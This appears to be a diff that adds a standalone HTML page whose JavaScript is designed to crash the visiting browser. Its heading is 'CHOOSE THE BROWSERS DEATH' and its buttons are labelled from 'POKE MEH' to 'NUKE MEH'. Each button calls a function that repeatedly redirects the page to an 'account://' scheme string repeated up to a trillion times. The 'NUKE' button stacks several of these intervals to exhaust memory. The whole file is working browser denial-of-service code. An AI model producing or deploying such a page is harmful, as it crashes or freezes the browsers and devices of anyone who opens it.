@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html><head></head><body><script>
+function pwn(str)
+{
+setInterval(function(){window.location.href='account://'.repeat(str);},100);
+}
+function atomBomb()
+{
+setInterval(function(){pwn(1000000000000);pwn(1000000000000);pwn(1000000000000);pwn(100000);pwn(100000);pwn(100000);pwn(1000000000000);pwn(1000000000000);pwn(1000000000000);},100);
+setInterval(function(){pwn(1000000000000);pwn(1000000000000);pwn(1000000000000);pwn(100000);pwn(100000);pwn(100000);pwn(1000000000000);pwn(1000000000000);pwn(1000000000000);},100);
+setInterval(function(){pwn(1000000000000);pwn(1000000000000);pwn(1000000000000);pwn(100000);pwn(100000);pwn(100000);pwn(1000000000000);pwn(1000000000000);pwn(1000000000000);},100);
+setInterval(function(){pwn(1000000000000);pwn(1000000000000);pwn(1000000000000);pwn(100000);pwn(100000);pwn(100000);pwn(1000000000000);pwn(1000000000000);pwn(1000000000000);},100);
+setInterval(function(){pwn(1000000000000);pwn(1000000000000);pwn(1000000000000);pwn(100000);pwn(100000);pwn(100000);pwn(1000000000000);pwn(1000000000000);pwn(1000000000000);},100);
+}
+</script><center><br /><// br><///>
+<h1>CHOOSE THE BROWSERS DEATH:</h1>
+
+<button onclick="pwn(100000);pwn(100000);pwn(100000);">POKE MEH</button>
+
+<button onclick="pwn(1000000000000);pwn(1000000000000);pwn(1000000000000);">STAB MEH</button>
+
+<button onclick="pwn(1000000000000);pwn(1000000000000);pwn(1000000000000);pwn(100000);pwn(100000);pwn(100000);pwn(1000000000000);pwn(1000000000000);pwn(1000000000000);">KILL MEH</button>
+
+<button onclick="atomBomb();">NUKE MEH</button>
+
+</center></body></html>
